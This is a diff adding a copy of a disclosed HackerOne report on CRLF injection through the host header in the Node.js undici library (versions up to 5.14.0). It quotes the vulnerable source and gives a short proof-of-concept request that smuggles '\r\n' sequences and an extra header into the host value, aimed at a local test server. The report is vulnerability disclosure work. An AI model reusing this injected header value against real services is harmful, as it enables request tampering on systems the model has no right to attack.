@@ -1,0 +1,85 @@
+# CRLF Injection in Nodejs ‘undici’ via host
+
+## Report Details
+- **Report ID**: 1820955
+- **URL**: https://hackerone.com/reports/1820955
+- **State**: Closed
+- **Severity**: medium
+- **Submitted**: 2023-01-03T12:18:52.302Z
+- **Disclosed**: 2023-02-22T03:46:24.179Z
+
+## Reporter
+- **Username**: timon8
+- **Name**: N/A
+
+## Team
+- **Name**: N/A
+- **Handle**: nodejs
+
+## Vulnerability Information
+**Summary:** undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api.
+
+
+**Description:**
+like https://hackerone.com/reports/1664019
+Source code:
+lib/core/request.js:296
+```javascript
+function processHeader (request, key, val) {
+  if (val && (typeof val === 'object' && !Array.isArray(val))) {
+    throw new InvalidArgumentError(`invalid ${key} header`)
+  } else if (val === undefined) {
+    return
+  }
+
+  if (
+    request.host === null &&
+    key.length === 4 &&
+    key.toLowerCase() === 'host'
+  ) {
+    // Consumed by Client
+    request.host = val // without headerCharRegex.exec(val)
+  } else if (
+    request.contentLength === null &&
+...
+```
+Example:
+```javascript
+import { request } from 'undici'
+
+const unsanitizedContentTypeInput =  '12 \r\n\r\naaa:aaa'
+
+const {
+    statusCode,
+    headers,
+    trailers,
+    body
+} = await request('http://127.0.0.1:23333', {
+    method: 'GET',
+    headers: {
+        'content-type': 'application/json',
+        'host': unsanitizedContentTypeInput
+    }
+})
+
+console.log('response received', statusCode)
+console.log('headers', headers)
+
+for await (const data of body) {
+    console.log('data', data)
+}
+
+console.log('trailers', trailers)
+
+```
+{F2100713}
+
+## Impact: 
+```<=undici@5.14.0```
+
+## Impact
+
+```<=undici@5.14.0```
+
+## Attachments
+- image.png
